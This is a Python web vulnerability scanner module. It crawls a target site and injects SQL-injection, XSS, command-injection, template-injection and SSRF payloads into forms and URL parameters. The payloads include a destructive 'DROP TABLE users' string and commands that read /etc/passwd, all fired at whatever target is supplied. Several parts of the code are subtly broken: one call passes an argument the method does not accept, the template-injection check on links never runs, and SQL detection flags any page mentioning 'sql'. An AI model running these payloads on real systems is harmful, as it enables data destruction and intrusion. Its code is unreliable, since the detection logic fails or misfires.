import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import urllib.parse
from datetime import datetime
from models import db, Scan, Vulnerability

SQL_PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT NULL--",
    "'; DROP TABLE users--",
    "' OR SLEEP(5)--",
    "' AND 1=1--",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "\"><script>alert(1)</script>",
]

CMD_PAYLOADS = [
    "; ls",
    "| cat /etc/passwd",
    "|| whoami",
]

SSTI_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
]

class SpiderR:
    def __init__(self, scan_id, target, socketio=None):
        self.scan_id = scan_id
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
        self.visited = set()
        self.vuln_count = 0
        self.socketio = socketio

    def update_progress(self, current_url, percent=None):
        scan = Scan.query.get(self.scan_id)
        if scan:
            scan.current_url = current_url
            if percent is not None:
                scan.progress = percent
            db.session.commit()
        if self.socketio:
            self.socketio.emit('progress', {'scan_id': self.scan_id, 'url': current_url, 'percent': percent}, room=self.scan_id)

    def add_vuln(self, vuln_type, url, param, payload, severity, description):
        vuln = Vulnerability(
            scan_id=self.scan_id,
            type=vuln_type,
            url=url,
            param=param,
            payload=payload,
            severity=severity,
            description=description,
            timestamp=datetime.utcnow()
        )
        db.session.add(vuln)
        db.session.commit()
        self.vuln_count += 1
        scan = Scan.query.get(self.scan_id)
        scan.vuln_count = self.vuln_count
        db.session.commit()
        if self.socketio:
            self.socketio.emit('vuln_found', {'scan_id': self.scan_id, 'type': vuln_type, 'url': url}, room=self.scan_id)

    def test_url(self, url, method='GET', data=None, param_name=None):
        try:
            if method.upper() == 'GET':
                resp = self.session.get(url, params=data, timeout=10)
            else:
                resp = self.session.post(url, data=data, timeout=10)

            sql_errors = ["sql", "mysql", "syntax error", "unclosed quotation"]
            if any(err in resp.text.lower() for err in sql_errors):
                self.add_vuln('SQL Injection', url, param_name, str(data), 'HIGH', 'SQL error detected')

            for payload in XSS_PAYLOADS:
                if payload in resp.text:
                    self.add_vuln('XSS', url, param_name, payload, 'MEDIUM', 'Payload reflected')
                    break

            cmd_indicators = ['root:', 'uid=', 'Directory of']
            if any(ind in resp.text for ind in cmd_indicators):
                self.add_vuln('Command Injection', url, param_name, str(data), 'CRITICAL', 'Command output reflected')

            for payload in SSTI_PAYLOADS:
                if payload in (data.values() if data else []):
                    if '49' in resp.text and payload == '{{7*7}}':
                        self.add_vuln('SSTI', url, param_name, payload, 'HIGH', 'Template injection detected (49 in response)')
                    if '49' in resp.text and payload in ['${7*7}', '#{7*7}']:
                        self.add_vuln('SSTI', url, param_name, payload, 'HIGH', 'Template injection detected')
                    break

            return resp
        except Exception as e:
            print(f"Error testing {url}: {e}")
            return None

    def inject_into_forms(self, form, page_url):
        action = form.get('action')
        method = form.get('method', 'get').lower()
        inputs = form.find_all('input')
        form_data = {inp.get('name'): 'test' for inp in inputs if inp.get('name')}
        csrf_tokens = ['csrf', 'token', 'xsrf', 'authenticity_token']
        has_token = any(token in key.lower() for key in form_data.keys())
        if not has_token:
            self.add_vuln('CSRF', page_url, 'form', 'No CSRF token', 'MEDIUM', 'Form lacks CSRF protection token')
        for payloads in [SQL_PAYLOADS, XSS_PAYLOADS, CMD_PAYLOADS, SSTI_PAYLOADS]:
            for payload in payloads:
                for key in form_data.keys():
                    original = form_data[key]
                    form_data[key] = payload
                    full_url = urljoin(page_url, action)
                    if method == 'post':
                        self.test_url(full_url, 'POST', data=form_data, param_name=key)
                    else:
                        self.test_url(full_url, 'GET', params=form_data, param_name=key)
                    form_data[key] = original

    def inject_into_links(self, url):
        parsed = urllib.parse.urlparse(url)
        if not parsed.query:
            return
        query_params = urllib.parse.parse_qs(parsed.query)
        for param in query_params:
            if any(x in param.lower() for x in ['url', 'dest', 'redirect', 'next']):
                ssrf_payload = 'http://127.0.0.1:80'
                new_params = query_params.copy()
                new_params[param] = [ssrf_payload]
                new_query = urllib.parse.urlencode(new_params, doseq=True)
                new_url = parsed._replace(query=new_query).geturl()
                try:
                    resp = self.session.get(new_url, timeout=10)
                    if any(x in resp.text.lower() for x in ['apache', 'nginx', 'iis', 'internal']):
                        self.add_vuln('SSRF', new_url, param, ssrf_payload, 'HIGH', 'Possible internal resource fetch')
                except:
                    pass
            for payload in SQL_PAYLOADS + XSS_PAYLOADS + CMD_PAYLOADS + SSTI_PAYLOADS:
                new_params = query_params.copy()
                new_params[param] = [payload]
                new_query = urllib.parse.urlencode(new_params, doseq=True)
                new_url = parsed._replace(query=new_query).geturl()
                self.test_url(new_url, param_name=param)

    def crawl(self, url):
        if url in self.visited:
            return
        self.visited.add(url)
        progress = min(100, int(len(self.visited) / 10))
        self.update_progress(url, progress)
        try:
            resp = self.session.get(url, timeout=10)
            soup = BeautifulSoup(resp.text, 'html.parser')
            for link in soup.find_all('a', href=True):
                full_url = urljoin(url, link['href'])
                if full_url.startswith(self.target) and full_url not in self.visited:
                    self.crawl(full_url)
            for form in soup.find_all('form'):
                self.inject_into_forms(form, url)
            self.inject_into_links(url)
        except Exception as e:
            print(f"Error crawling {url}: {e}")

    def run(self):
        self.update_progress(self.target, 0)
        self.crawl(self.target)
        self.update_progress('Finished', 100)
        scan = Scan.query.get(self.scan_id)
        scan.status = 'completed'
        scan.end_time = datetime.utcnow()
        db.session.commit()
